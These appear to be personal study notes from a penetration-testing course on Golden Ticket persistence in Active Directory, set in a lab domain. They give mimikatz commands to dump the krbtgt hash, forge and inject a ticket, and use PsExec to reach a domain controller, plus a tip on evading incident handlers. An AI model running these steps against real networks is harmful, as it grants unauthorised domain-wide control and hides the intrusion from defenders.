We can use traitional Persistence methods as well as AD specific persistence. 

Going back to Kerb auth, recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs of the domain. Secret key is actually the pw hash of a domain user account called the **krbtgt**. 

If we are able to get the krbtgt pw hash, we can create our own self-made custom TGTs, aka **Golden Tickets**.

For ex. we would create a TGT stating that non-priv user is actually a member of the Domain Admins group, and the DC will trust it since it's correctly encrtpyed.

***
During an assessment, we want to get the cusomters permission before exeucting this attack, since it grants unlimited domain access.
***

This provides persistence in the AD environment, and the advantage is that the krbtgt account pw is not automatically changed. This pw is onyl changed with the domain functional level is upgraded from Win2003 to Win2008. Thus it is not uncommon to find very old krbtgt pw hashes. 

***
The Domain Functional Level697 dictates the capabilities of the domain and
determines which Windows operating systems can be run on the domain
controller. Higher functional levels enable additional features, functionality, and
security mitigations.
***

To test this tech, we will attempt to move laterally from the win10 workstation to the DC via PsExec as the Offsec user.

This should fail as we do not have proper perms:
C:\Tools\active_directory>
` psexec.exe \\dc01 cmd.exe`
Access is denied.

At this point, we should have access to an account that is a member of the Domain Admins group or have comp'd the DC itself. 

With this level of access, we can extract the PW hash of the krbtgt account with mimikatz. 

To simulate, we will log in to the DC via RDP using jeff_admin account and run Mimikatz on the C: folder and use lsadump:lsa:
`privilege::debug`
Privilege '20' OK

`lsadump::lsa /patch`
```
Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668
RID : 000001f4 (500)
User : Administrator
LM :
NTLM : e2b475c11da2a0748290d87aa966c327
RID : 000001f5 (501)
User : Guest
LM :
NTLM :
RID : 000001f6 (502)
User : krbtgt
LM :
NTLM : 75b60230a2394a812000dbfad8415965
...
```

Creating the golden ticket and injecting into memory DOES NOT require any admin privs and CAN be performed from a comp tht isn't joined to the domain. 

Purge before generating any tickets:
`kerberos::purge`

Create the Golden Ticket:
`kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-
2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt`
**/user:** Username we create
**/domain:** target domain
**/sid:** Domain SID taken from `whomai /user`
**/krbtgt** Used instead of **/rc4** to indicate we are suppling the pw hash
**/ptt** Inject ticket into memory

The fake username is allowed because the DC trust anything correctly encrypted bt the krbtgt pw hash. 

Mimikatz provides two sets of default values when using the Golden Ticket option:
- User ID is set to 500 by default, which is the RID of the built-in admin for the domain
- Groups ID are set to the most priv groups in AD, including the Domain Admins group

With the Golden Ticket injected into memory, we can launch a new cmd prompt and attempt let mvmt with PsExec:

mimikatz #
`misc::cmd`

C:\Users\offsec.crop>
`psexec.exe \\dc01 cmd.exe`
PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Windows\system32>
`ipconfig`
`whoami`
corp\fakeuser
`whoami /groups`
...
Corp\Domain Admins ....
...


We have an interactive cmd prompt on the DC and the rest of the info checks out. 

***
The use of a non-existent username may alert incident handlers if they are
reviewing access logs. In order to reduce suspicion, consider using the name and
ID of an existing system administrator.
***


### NTLM vs Kerb Note:
By creating our own TGT and using PsExec, we perform the Overpass The Hash tech by leveraging Kerb auth. If we connext to PsExec using the IP of the DC instead of the hostname, we would instead force the use of NTLM auth and access woudl still be blocked!!

